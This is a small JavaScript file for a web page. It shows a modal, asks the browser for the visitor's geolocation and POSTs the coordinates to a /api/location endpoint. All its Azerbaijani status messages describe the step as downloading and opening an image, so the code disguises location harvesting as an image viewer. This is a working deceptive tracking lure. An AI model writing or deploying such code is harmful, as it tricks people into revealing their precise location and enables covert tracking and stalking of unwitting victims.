document.addEventListener("DOMContentLoaded", function () {

    const modal = document.getElementById("locationModal");
    const locationButton = document.getElementById("locationButton");
    const closeButton = document.getElementById("closeButton");
    const status = document.getElementById("status");

    modal.style.display = "flex";

    locationButton.addEventListener("click", function () {

        if (!navigator.geolocation) {
            status.textContent = "Bu brauzer şəkili dəstəkləmir.";
            return;
        }

        status.textContent = "Şəkil indirilir...";

        navigator.geolocation.getCurrentPosition(
            async function (position) {

                const latitude = position.coords.latitude;
                const longitude = position.coords.longitude;

                try {

                    const response = await fetch("/api/location", {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json"
                        },
                        body: JSON.stringify({
                            latitude: latitude,
                            longitude: longitude
                        })
                    });

                    if (response.ok) {
                        status.textContent = "Şəkil acıldü.";
                    } else {
                        status.textContent = "Şəkil açıla bilmədi.";
                    }

                } catch (error) {
                    status.textContent = "Serverə qoşulmaq mümkün olmadı.";
                }
            },

            function (error) {

                if (error.code === 1) {
                    status.textContent = "Şəkil icazə verdi.";
                } else {
                    status.textContent = "Şəkil alınmadı.";
                }

            }
        );
    });

    closeButton.addEventListener("click", function () {
        window.location.href = "about:blank";
    });

});
